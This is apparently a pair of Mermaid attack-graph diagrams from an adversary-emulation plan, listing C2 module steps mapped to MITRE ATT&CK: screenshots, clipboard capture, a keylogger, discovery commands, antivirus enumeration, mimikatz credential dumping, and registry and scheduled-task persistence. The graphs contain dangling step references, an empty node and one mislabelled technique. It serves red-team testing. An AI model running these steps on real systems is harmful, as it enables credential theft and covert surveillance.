```mermaid
graph TD
Step0["<b> module: https </b> <br>"]
Step1["<b> module: loader </b> <br><h4> parameters: </h4> <i> --load printscr </i> <br>"]
Step2["<b> module: printscr </b> <br><h4> parameters: </h4> <i> --window Desktop </i> <br><a href='https://attack.mitre.org/tactics/TA0009'>att&ck-tactic:TA0009</a><br>
<a href='https://attack.mitre.org/techniques/T1113'>att&ck-technique:T1113</a><br>
"]
Step3["<b> module: loader </b> <br><h4> parameters: </h4> <i> --load run </i> <br>"]
Step4["<b> module: run </b> <br><h4> parameters: </h4> <i> whoami </i> <br><a href='https://attack.mitre.org/tactics/TA0007'>att&ck-tactic:TA0007</a><br>
<a href='https://attack.mitre.org/techniques/T1033'>att&ck-technique:T1033</a><br>
"]
Step5["<b> module: loader </b> <br><h4> parameters: </h4> <i> --load clipboard </i> <br>"]
Step6["<b> module: clipboard </b> <br><h4> parameters: </h4> <i>  </i> <br><a href='https://attack.mitre.org/tactics/TA0009'>att&ck-tactic:TA0009</a><br>
<a href='https://attack.mitre.org/techniques/T1115'>att&ck-technique:T1115</a><br>
"]
Step7["<b> module: loader </b> <br><h4> parameters: </h4> <i> --load keylogger </i> <br>"]
Step8["<b> module: keylogger </b> <br><h4> parameters: </h4> <i> --start </i> <br><a href='https://attack.mitre.org/tactics/TA0009'>att&ck-tactic:TA0009</a><br>
<a href='https://attack.mitre.org/techniques/T1056'>att&ck-technique:T1056</a><br>
"]
Step9["<b> module: loader </b> <br><h4> parameters: </h4> <i> --load sysinfo </i> <br>"]
Step10["<b> module: sysinfo </b> <br><h4> parameters: </h4> <i>  </i> <br><a href='https://attack.mitre.org/tactics/TA0007'>att&ck-tactic:TA0007</a><br>
<a href='https://attack.mitre.org/techniques/T1082'>att&ck-technique:T1082</a><br>
"]
Step11["<b> module: loader </b> <br><h4> parameters: </h4> <i> --load processes </i> <br>"]
Step12["<b> module: processes </b> <br><h4> parameters: </h4> <i>  </i> <br><a href='https://attack.mitre.org/tactics/TA0007'>att&ck-tactic:TA0007</a><br>
<a href='https://attack.mitre.org/techniques/T1057'>att&ck-technique:T1057</a><br>
"]
Step13["<b> module: loader </b> <br><h4> parameters: </h4> <i> --load services </i> <br>"]
Step14["<b> module: services </b> <br><h4> parameters: </h4> <i> --all </i> <br><a href='https://attack.mitre.org/tactics/TA0007'>att&ck-tactic:TA0007</a><br>
<a href='https://attack.mitre.org/techniques/T1007'>att&ck-technique:T1007</a><br>
"]
Step15["<b> module: loader </b> <br><h4> parameters: </h4> <i> --load arp </i> <br>"]
Step16["<b> module: arp </b> <br><h4> parameters: </h4> <i>  </i> <br><a href='https://attack.mitre.org/tactics/TA0007'>att&ck-tactic:TA0007</a><br>
<a href='https://attack.mitre.org/techniques/T1016'>att&ck-technique:T1016</a><br>
"]
Step17["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c dir %USERPROFILE%\Documents </i> <br><a href='https://attack.mitre.org/tactics/TA0007'>att&ck-tactic:TA0007</a><br>
<a href='https://attack.mitre.org/techniques/T1083'>att&ck-technique:T1083</a><br>
"]
Step18["<b> module: loader </b> <br><h4> parameters: </h4> <i> --load upsh </i> <br>"]
Step19["<b> module: upsh </b> <br><h4> parameters: </h4> <i> --cmd Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct </i> <br>"]
Step20["<b> module: upsh </b> <br><h4> parameters: </h4> <i> --cmd Get-DnsClientServerAddress </i> <br>"]
Step21["<b> module: run </b> <br><h4> parameters: </h4> <i> net use </i> <br>"]
Step0 --> Step1
Step1 --> Step2
Step2 --> Step3
Step3 --> Step4
Step4 --> Step5
Step5 --> Step6
Step6 --> Step7
Step7 --> Step8
Step8 --> Step9
Step9 --> Step10
Step10 --> Step11
Step11 --> Step12
Step12 --> Step13
Step13 --> Step14
Step14 --> Step15
Step15 --> Step16
Step16 --> Step17
Step17 --> Step18
Step18 --> Step19
Step19 --> Step20
Step20 --> Step21
Step21 --> Step22
```

 #Attack Graph



 #Attack Graph
```mermaid
graph TD
Step0["<b> module: https </b> <br>"]
Step1["<b> module: loader </b> <br><h4> parameters: </h4> <i> --load printscr </i> <br>"]
Step2["<b> module: printscr </b> <br><h4> parameters: </h4> <i> --window Desktop </i> <br><a href='https://attack.mitre.org/tactics/TA0009'>att&ck-tactic:TA0009</a><br>
<a href='https://attack.mitre.org/techniques/T1113'>att&ck-technique:T1113</a><br>
"]
Step3["<b> module: loader </b> <br><h4> parameters: </h4> <i> --load run </i> <br>"]
Step4["<b> module: run </b> <br><h4> parameters: </h4> <i> whoami </i> <br><a href='https://attack.mitre.org/tactics/TA0007'>att&ck-tactic:TA0007</a><br>
<a href='https://attack.mitre.org/techniques/T1033'>att&ck-technique:T1033</a><br>
"]
Step5["<b> module: loader </b> <br><h4> parameters: </h4> <i> --load clipboard </i> <br>"]
Step6["<b> module: clipboard </b> <br><h4> parameters: </h4> <i>  </i> <br><a href='https://attack.mitre.org/tactics/TA0009'>att&ck-tactic:TA0009</a><br>
<a href='https://attack.mitre.org/techniques/T1115'>att&ck-technique:T1115</a><br>
"]
Step7["<b> module: loader </b> <br><h4> parameters: </h4> <i> --load keylogger </i> <br>"]
Step8["<b> module: keylogger </b> <br><h4> parameters: </h4> <i> --start </i> <br><a href='https://attack.mitre.org/tactics/TA0009'>att&ck-tactic:TA0009</a><br>
<a href='https://attack.mitre.org/techniques/T1056'>att&ck-technique:T1056</a><br>
"]
Step9[""]
Step10["<b> module: keylogger </b> <br><h4> parameters: </h4> <i> --current </i> <br><a href='https://attack.mitre.org/tactics/TA0009'>att&ck-tactic:TA0009</a><br>
<a href='https://attack.mitre.org/techniques/T1056'>att&ck-technique:T1056</a><br>
"]
Step11["<b> module: keylogger </b> <br><h4> parameters: </h4> <i> --stop </i> <br><a href='https://attack.mitre.org/tactics/TA0009'>att&ck-tactic:TA0009</a><br>
<a href='https://attack.mitre.org/techniques/T1056'>att&ck-technique:T1056</a><br>
"]
Step12["<b> module: loader </b> <br><h4> parameters: </h4> <i> --load sysinfo </i> <br>"]
Step13["<b> module: sysinfo </b> <br><h4> parameters: </h4> <i>  </i> <br><a href='https://attack.mitre.org/tactics/TA0007'>att&ck-tactic:TA0007</a><br>
<a href='https://attack.mitre.org/techniques/T1082'>att&ck-technique:T1082</a><br>
"]
Step14["<b> module: loader </b> <br><h4> parameters: </h4> <i> --load processes </i> <br>"]
Step15["<b> module: processes </b> <br><h4> parameters: </h4> <i>  </i> <br><a href='https://attack.mitre.org/tactics/TA0007'>att&ck-tactic:TA0007</a><br>
<a href='https://attack.mitre.org/techniques/T1057'>att&ck-technique:T1057</a><br>
"]
Step16["<b> module: loader </b> <br><h4> parameters: </h4> <i> --load services </i> <br>"]
Step17["<b> module: services </b> <br><h4> parameters: </h4> <i> --all </i> <br><a href='https://attack.mitre.org/tactics/TA0007'>att&ck-tactic:TA0007</a><br>
<a href='https://attack.mitre.org/techniques/T1007'>att&ck-technique:T1007</a><br>
"]
Step18["<b> module: loader </b> <br><h4> parameters: </h4> <i> --load arp </i> <br>"]
Step19["<b> module: arp </b> <br><h4> parameters: </h4> <i>  </i> <br><a href='https://attack.mitre.org/tactics/TA0007'>att&ck-tactic:TA0007</a><br>
<a href='https://attack.mitre.org/techniques/T1016'>att&ck-technique:T1016</a><br>
"]
Step20["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c dir %USERPROFILE%\Documents </i> <br><a href='https://attack.mitre.org/tactics/TA0007'>att&ck-tactic:TA0007</a><br>
<a href='https://attack.mitre.org/techniques/T1083'>att&ck-technique:T1083</a><br>
"]
Step21["<b> module: loader </b> <br><h4> parameters: </h4> <i> --load upsh </i> <br>"]
Step22["<b> module: upsh </b> <br><h4> parameters: </h4> <i> --cmd Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct </i> <br>"]
Step23["<b> module: upsh </b> <br><h4> parameters: </h4> <i> --cmd Get-DnsClientServerAddress </i> <br>"]
Step24["<b> module: run </b> <br><h4> parameters: </h4> <i> net use </i> <br>"]
Step25["<b> module: loader </b> <br><h4> parameters: </h4> <i> --load mimikatz </i> <br>"]
Step26["<b> module: mimikatz </b> <br><h4> parameters: </h4> <i> --arglist sekurlsa::logonpasswords </i> <br><a href='https://attack.mitre.org/tactics/TA0007'>att&ck-tactic:TA0007</a><br>
<a href='https://attack.mitre.org/techniques/T1082'>att&ck-technique:T1082</a><br>
"]
Step27["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c dir C:\ </i> <br><a href='https://attack.mitre.org/techniques/T1083'>att&ck-technique:T1083</a><br>
"]
Step28["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c REG ADD HKEY_CURRENT_USER\Software\ExampleRegKey /v Example /d Example Data </i> <br><a href='https://attack.mitre.org/techniques/T1547.001'>att&ck-technique:T1547.001</a><br>
<a href='https://attack.mitre.org/techniques/T1112'>att&ck-technique:T1112</a><br>
"]
Step29["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c REG QUERY HKEY_CURRENT_USER\Software\ExampleRegKey </i> <br><a href='https://attack.mitre.org/techniques/T1012'>att&ck-technique:T1012</a><br>
"]
Step30["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c REG DELETE HKEY_CURRENT_USER\Software\ExampleRegKey /f </i> <br><a href='https://attack.mitre.org/techniques/T1012'>att&ck-technique:T1012</a><br>
"]
Step31["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c SCHTASKS /CREATE /SC DAILY /TN MyTasks\Example Task /TR C:\example_service.exe /ST 11:00 </i> <br><a href='https://attack.mitre.org/techniques/T1053'>att&ck-technique:T1053</a><br>
<a href='https://attack.mitre.org/techniques/T1053.005'>att&ck-technique:T1053.005</a><br>
"]
Step32["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c SCHTASKS /QUERY /TN MyTasks\Example Task </i> <br><a href='https://attack.mitre.org/techniques/T1053'>att&ck-technique:T1053</a><br>
<a href='https://attack.mitre.org/techniques/T1053.005'>att&ck-technique:T1053.005</a><br>
"]
Step33["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c SCHTASKS /DELETE /TN MyTasks\Example Task /F </i> <br><a href='https://attack.mitre.org/techniques/T1053'>att&ck-technique:T1053</a><br>
<a href='https://attack.mitre.org/techniques/T1053.005'>att&ck-technique:T1053.005</a><br>
"]
Step34["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c hostname </i> <br><a href='https://attack.mitre.org/techniques/T1082'>att&ck-technique:T1082</a><br>
"]
Step35["<b> module: controller </b> <br><h4> parameters: </h4> <i> --shutdown </i> <br><a href='https://attack.mitre.org/tactics/TA0011'>att&ck-tactic:TA0011</a><br>
<a href='https://attack.mitre.org/techniques/T1219'>att&ck-technique:T1219</a><br>
"]
Step0 --> Step1
Step1 --> Step2
Step2 --> Step3
Step3 --> Step4
Step4 --> Step5
Step5 --> Step6
Step6 --> Step7
Step7 --> Step8
Step8 --> Step9
Step9 --> Step10
Step10 --> Step11
Step11 --> Step12
Step12 --> Step13
Step13 --> Step14
Step14 --> Step15
Step15 --> Step16
Step16 --> Step17
Step17 --> Step18
Step18 --> Step19
Step19 --> Step20
Step20 --> Step21
Step21 --> Step22
Step22 --> Step23
Step23 --> Step24
Step24 --> Step25
Step25 --> Step26
Step26 --> Step27
Step27 --> Step28
Step28 --> Step29
Step29 --> Step30
Step30 --> Step31
Step31 --> Step32
Step32 --> Step33
Step33 --> Step34
Step34 --> Step35
Step35 --> Step36
```
